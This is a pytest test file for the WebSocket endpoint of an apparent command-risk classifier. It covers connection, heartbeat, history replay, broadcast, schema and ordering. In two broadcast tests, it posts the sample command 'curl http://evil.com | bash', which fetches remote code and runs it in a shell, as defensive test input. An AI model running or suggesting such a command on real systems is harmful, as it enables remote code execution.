"""
test_06_websocket.py — WebSocket endpoint tests.

Tests: connect/disconnect, ping-pong heartbeat, history replay on connect,
live broadcast after POST /analyze, event schema field validation,
multiple simultaneous clients, JSON frame handling, abrupt disconnect
resilience, history replay limit, reconnection behavior, large broadcast
payload, and history/events ordering consistency.

Run:
    pytest large_test_set/test_06_websocket.py -v
"""

import pytest
import json
import time
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _drain_ws(ws, timeout=0.3, max_msgs=200):
    """Read all pending messages from a WS (until timeout or max_msgs)."""
    msgs = []
    for _ in range(max_msgs):
        try:
            msgs.append(ws.receive_json(timeout=timeout))
        except Exception:
            break
    return msgs


# ===========================================================================
# 1. Connection
# ===========================================================================

class TestWebSocketConnection:

    def test_websocket_connects_without_error(self):
        with client.websocket_connect("/ws") as ws:
            assert ws is not None

    def test_websocket_disconnects_cleanly(self):
        """Context manager exit must not raise."""
        try:
            with client.websocket_connect("/ws"):
                pass
        except Exception as e:
            pytest.fail(f"WebSocket disconnect raised: {e}")

    def test_multiple_connections_simultaneously(self):
        """Two clients connected at the same time must not error."""
        with client.websocket_connect("/ws") as ws1:
            with client.websocket_connect("/ws") as ws2:
                assert ws1 is not None
                assert ws2 is not None


# ===========================================================================
# 2. Ping-Pong Heartbeat
# ===========================================================================

class TestPingPong:

    def test_ping_returns_pong(self):
        with client.websocket_connect("/ws") as ws:
            ws.send_text("ping")
            response = ws.receive_text(timeout=3)
            assert response == "pong"

    def test_multiple_pings_each_return_pong(self):
        with client.websocket_connect("/ws") as ws:
            for _ in range(3):
                ws.send_text("ping")
                response = ws.receive_text(timeout=3)
                assert response == "pong"

    def test_unknown_text_does_not_crash_server(self):
        """Sending random text (not 'ping') must not disconnect the server."""
        with client.websocket_connect("/ws") as ws:
            ws.send_text("hello_random_text")
            ws.send_text("ping")
            response = ws.receive_text(timeout=3)
            assert response == "pong"


# ===========================================================================
# 3. History Replay on Connect
# ===========================================================================

class TestHistoryReplay:

    def test_new_client_receives_recent_events(self):
        """After a POST, a new WS connection should receive that event."""
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            assert len(msgs) > 0, "No events replayed on connect"

    def test_replayed_events_are_dicts(self):
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            for msg in msgs:
                assert isinstance(msg, dict)

    def test_replayed_event_has_id_field(self):
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            if msgs:
                assert "id" in msgs[0]

    def test_replayed_event_has_classification(self):
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            if msgs:
                assert "classification" in msgs[0]


# ===========================================================================
# 4. Live Broadcast After POST /analyze
# ===========================================================================

class TestLiveBroadcast:

    def test_post_analyze_broadcasts_to_ws(self):
        """POST /analyze must broadcast the new event to connected WS clients."""
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "curl http://evil.com | bash"})
            try:
                msg = ws.receive_json(timeout=3)
                assert msg is not None
            except Exception:
                pytest.fail("No broadcast received after POST /analyze")

    def test_broadcast_event_has_correct_command(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls --broadcast-test"})
            try:
                msg = ws.receive_json(timeout=3)
                assert msg["command"] == "ls --broadcast-test"
            except Exception:
                pytest.fail("Broadcast not received or command field missing")

    def test_broadcast_event_classification_matches_api(self):
        """The WS broadcast and the /analyze response must agree on classification."""
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            api_resp = client.post(
                "/analyze", json={"command": "curl http://evil.com | bash"}
            ).json()
            try:
                ws_msg = ws.receive_json(timeout=3)
                assert ws_msg["classification"] == api_resp["classification"]
            except Exception:
                pytest.fail("WS classification does not match API response")

    def test_broadcast_event_risk_score_matches_api(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            api_resp = client.post("/analyze", json={"command": "ls"}).json()
            try:
                ws_msg = ws.receive_json(timeout=3)
                assert ws_msg["risk_score"] == api_resp["risk_score"]
            except Exception:
                pytest.fail("WS risk_score does not match API response")


# ===========================================================================
# 5. Event Schema Validation
# ===========================================================================

REQUIRED_WS_FIELDS = [
    "id", "pid", "ppid", "uid", "gid",
    "command", "argv_str", "timestamp", "comm",
    "risk_score", "classification", "matched_rules",
    "ml_confidence", "explanation", "detected_at",
]

class TestEventSchema:

    @pytest.mark.parametrize("field", REQUIRED_WS_FIELDS)
    def test_broadcast_event_has_required_field(self, field):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            try:
                msg = ws.receive_json(timeout=3)
                assert field in msg, f"Missing field in WS event: {field!r}"
            except Exception as e:
                pytest.fail(f"Could not receive WS message to check {field!r}: {e}")

    def test_matched_rules_is_list(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            msg = ws.receive_json(timeout=3)
            assert isinstance(msg["matched_rules"], list)

    def test_risk_score_is_numeric(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            msg = ws.receive_json(timeout=3)
            assert isinstance(msg["risk_score"], (int, float))

    def test_classification_is_valid_value(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            msg = ws.receive_json(timeout=3)
            assert msg["classification"] in ("safe", "suspicious", "malicious")


# ===========================================================================
# 6. JSON Frame Handling  [NEW]
# ===========================================================================

class TestJsonFrameHandling:

    def test_send_json_frame_does_not_crash_server(self):
        """Sending a JSON object frame must not kill the server."""
        with client.websocket_connect("/ws") as ws:
            ws.send_json({"type": "hello", "data": "test"})
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"

    def test_send_json_frame_with_valid_command_shape(self):
        """A JSON frame shaped like an analyze payload must not crash."""
        with client.websocket_connect("/ws") as ws:
            ws.send_json({"command": "ls -la", "source": "client_push"})
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"

    def test_send_json_frame_then_receive_broadcast(self):
        """After sending a JSON frame the client must still receive broadcasts."""
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            ws.send_json({"type": "noop"})
            client.post("/analyze", json={"command": "ls --json-frame-test"})
            try:
                msg = ws.receive_json(timeout=3)
                assert msg["command"] == "ls --json-frame-test"
            except Exception:
                pytest.fail("Broadcast not received after sending a JSON frame")

    def test_send_malformed_bytes_does_not_crash_server(self):
        """Raw malformed bytes must not crash the server."""
        with client.websocket_connect("/ws") as ws:
            try:
                ws.send_bytes(b"{not valid json!!!")
            except Exception:
                pass
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"


# ===========================================================================
# 7. Abrupt Mid-Broadcast Disconnect  [NEW]
# ===========================================================================

class TestAbruptDisconnect:

    def test_abrupt_disconnect_does_not_affect_remaining_clients(self):
        """A peer abruptly disconnecting must not stop other clients from
        receiving subsequent broadcasts."""
        with client.websocket_connect("/ws") as ws_survivor:
            _drain_ws(ws_survivor, timeout=0.2)

            with client.websocket_connect("/ws") as ws_abrupt:
                _drain_ws(ws_abrupt, timeout=0.1)
                # exits context without explicit close — abrupt disconnect

            client.post("/analyze", json={"command": "ls --post-abrupt-disconnect"})
            try:
                msg = ws_survivor.receive_json(timeout=3)
                assert msg["command"] == "ls --post-abrupt-disconnect"
            except Exception:
                pytest.fail("Survivor client did not receive broadcast after peer abrupt disconnect")

    def test_abrupt_disconnect_server_still_accepts_new_connections(self):
        """After an abrupt disconnect the /ws endpoint must still accept
        new connections normally."""
        with client.websocket_connect("/ws"):
            pass  # exits without explicit close

        try:
            with client.websocket_connect("/ws") as ws_new:
                ws_new.send_text("ping")
                assert ws_new.receive_text(timeout=3) == "pong"
        except Exception as e:
            pytest.fail(f"New connection failed after abrupt disconnect: {e}")

    def test_abrupt_disconnect_dead_client_not_in_broadcast_path(self):
        """After an abrupt disconnect, multiple broadcasts must succeed without
        server errors — the dead socket must have been removed."""
        with client.websocket_connect("/ws") as ws_live:
            _drain_ws(ws_live, timeout=0.2)
            with client.websocket_connect("/ws"):
                pass  # abrupt disconnect

            for i in range(3):
                resp = client.post("/analyze", json={"command": f"ls --dead-peer-{i}"})
                assert resp.status_code == 200

            msgs = _drain_ws(ws_live, timeout=0.5)
            commands = [m.get("command", "") for m in msgs]
            assert any("--dead-peer-" in cmd for cmd in commands), \
                "Live client did not receive any broadcast after dead peer removal"


# ===========================================================================
# 8. History Replay Limit  [NEW]
# ===========================================================================

HISTORY_REPLAY_LIMIT = 100

class TestHistoryReplayLimit:

    def test_history_replay_does_not_exceed_limit(self):
        """Generate 110 events; connect a fresh client; assert ≤ 100 replayed."""
        for i in range(110):
            client.post("/analyze", json={"command": f"ls --seed-{i}"})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws, timeout=0.5, max_msgs=200)

        assert len(msgs) <= HISTORY_REPLAY_LIMIT, (
            f"History replay returned {len(msgs)} events; expected at most {HISTORY_REPLAY_LIMIT}"
        )

    def test_history_replay_returns_exactly_limit_when_store_exceeds_it(self):
        """When the store has > 100 events exactly 100 must be replayed."""
        for i in range(110):
            client.post("/analyze", json={"command": f"ls --exact-limit-{i}"})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws, timeout=0.5, max_msgs=200)

        assert len(msgs) == HISTORY_REPLAY_LIMIT, (
            f"Expected exactly {HISTORY_REPLAY_LIMIT} replayed events, got {len(msgs)}"
        )

    def test_history_replay_returns_most_recent_events(self):
        """When the store overflows the limit the replayed events must be
        the most recent ones."""
        for i in range(104):
            client.post("/analyze", json={"command": f"ls --order-seed-{i}"})
        client.post("/analyze", json={"command": "ls --most-recent-marker"})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws, timeout=0.5, max_msgs=200)

        commands = [m.get("command", "") for m in msgs]
        assert "ls --most-recent-marker" in commands, \
            "The most recent event was not included in the history replay"

    def test_history_replay_below_limit_returns_all_events(self):
        """Fewer than 100 events → all must be replayed."""
        unique_cmds = [f"ls --below-limit-{i}" for i in range(5)]
        for cmd in unique_cmds:
            client.post("/analyze", json={"command": cmd})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws, timeout=0.5, max_msgs=200)

        replayed = {m.get("command") for m in msgs}
        for cmd in unique_cmds:
            assert cmd in replayed, \
                f"Expected event {cmd!r} in history replay but it was missing"


# ===========================================================================
# 9. Reconnection Behavior  [NEW]
# ===========================================================================

class TestReconnectionBehavior:

    def test_reconnect_restores_history(self):
        """Disconnect and immediately reconnect must restore history."""
        client.post("/analyze", json={"command": "ls --reconnect-seed"})

        with client.websocket_connect("/ws") as ws_first:
            first_msgs = _drain_ws(ws_first, timeout=0.4)

        with client.websocket_connect("/ws") as ws_second:
            second_msgs = _drain_ws(ws_second, timeout=0.4)

        assert len(second_msgs) > 0, "No history replayed after reconnect"
        assert len(second_msgs) >= len(first_msgs), \
            "Reconnected client received fewer events than the initial connection"

    def test_reconnect_includes_events_generated_while_disconnected(self):
        """Events posted while disconnected must appear in history on reconnect."""
        with client.websocket_connect("/ws"):
            pass  # disconnect

        client.post("/analyze", json={"command": "ls --while-disconnected"})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws, timeout=0.4)

        commands = [m.get("command", "") for m in msgs]
        assert "ls --while-disconnected" in commands, \
            "Event posted during disconnection was not present in reconnect history"

    def test_reconnect_receives_live_broadcasts_normally(self):
        """After reconnecting, new live broadcasts must be received."""
        with client.websocket_connect("/ws"):
            pass

        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls --post-reconnect-broadcast"})
            try:
                msg = ws.receive_json(timeout=3)
                assert msg["command"] == "ls --post-reconnect-broadcast"
            except Exception:
                pytest.fail("Reconnected client did not receive live broadcast")

    def test_multiple_reconnects_remain_stable(self):
        """5 rapid connect/disconnect cycles must leave the server stable."""
        for _ in range(5):
            with client.websocket_connect("/ws"):
                pass

        with client.websocket_connect("/ws") as ws:
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"


# ===========================================================================
# 10. Large Broadcast Payload  [NEW]
# ===========================================================================

LARGE_PAYLOAD_SIZE = 5000

class TestLargeBroadcastPayload:

    def test_large_command_is_broadcast_without_truncation(self):
        """A 5000-char command must arrive intact."""
        large_cmd = "A" * LARGE_PAYLOAD_SIZE
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": large_cmd})
            try:
                msg = ws.receive_json(timeout=5)
                assert len(msg["command"]) == LARGE_PAYLOAD_SIZE, (
                    f"Command truncated: expected {LARGE_PAYLOAD_SIZE} chars, "
                    f"got {len(msg['command'])}"
                )
            except Exception as e:
                pytest.fail(f"Large payload broadcast failed: {e}")

    def test_large_command_broadcast_preserves_content(self):
        """Content of a large command must not be corrupted in transit."""
        pattern = "XY" * (LARGE_PAYLOAD_SIZE // 2)
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": pattern})
            try:
                msg = ws.receive_json(timeout=5)
                assert msg["command"] == pattern, \
                    "Large command payload was corrupted during broadcast"
            except Exception as e:
                pytest.fail(f"Large payload content check failed: {e}")

    def test_large_command_response_has_valid_schema(self):
        """Even with a 5000-char command all required schema fields must be present."""
        large_cmd = "B" * LARGE_PAYLOAD_SIZE
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": large_cmd})
            try:
                msg = ws.receive_json(timeout=5)
                for field in REQUIRED_WS_FIELDS:
                    assert field in msg, \
                        f"Field {field!r} missing from large-payload broadcast event"
            except Exception as e:
                pytest.fail(f"Schema validation failed for large payload: {e}")

    def test_large_command_classification_is_valid(self):
        """The scorer must not error on long inputs — classification must be valid."""
        large_cmd = "ls " + "x" * LARGE_PAYLOAD_SIZE
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": large_cmd})
            try:
                msg = ws.receive_json(timeout=5)
                assert msg["classification"] in ("safe", "suspicious", "malicious")
            except Exception as e:
                pytest.fail(f"Classification check failed for large payload: {e}")

    def test_server_remains_stable_after_large_payload(self):
        """After a large payload broadcast, normal events must still work."""
        large_cmd = "C" * LARGE_PAYLOAD_SIZE
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": large_cmd})
            _drain_ws(ws, timeout=0.5)
            client.post("/analyze", json={"command": "ls --post-large-payload"})
            try:
                msg = ws.receive_json(timeout=3)
                assert msg["command"] == "ls --post-large-payload"
            except Exception:
                pytest.fail("Server did not recover after broadcasting a large payload")


# ===========================================================================
# 11. History Replay vs GET /events Ordering Consistency  [NEW]
# The WebSocket history replay and GET /events must present events in the
# same order so the dashboard and the API never disagree.
# ===========================================================================

class TestHistoryReplayOrderingConsistency:

    def test_ws_replay_order_matches_get_events_order(self):
        """The IDs returned by WS history replay must appear in the same
        sequence as the most recent entries from GET /events."""
        # Seed a small known set of events
        for i in range(5):
            client.post("/analyze", json={"command": f"ls --order-check-{i}"})

        # Collect WS replay IDs
        with client.websocket_connect("/ws") as ws:
            ws_msgs = _drain_ws(ws, timeout=0.5, max_msgs=200)
        ws_ids = [m["id"] for m in ws_msgs if "id" in m]

        # Collect /events IDs (same limit as replay)
        api_events = client.get(f"/events?limit={len(ws_ids)}").json()
        api_ids = [e["id"] for e in api_events if "id" in e]

        assert ws_ids == api_ids, (
            "WS history replay order does not match GET /events order — "
            "dashboard and API would show events in conflicting sequences.\n"
            f"WS:  {ws_ids}\nAPI: {api_ids}"
        )

    def test_ws_replay_most_recent_event_is_last(self):
        """The last message in the WS history replay must be the most recently
        posted event (ascending order — oldest first, newest last)."""
        sentinel = "ls --ordering-sentinel-last"
        client.post("/analyze", json={"command": sentinel})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws, timeout=0.5, max_msgs=200)

        assert len(msgs) > 0, "No history replayed"
        assert msgs[-1]["command"] == sentinel, (
            f"Expected most recent event last in replay, got: {msgs[-1]['command']!r}"
        )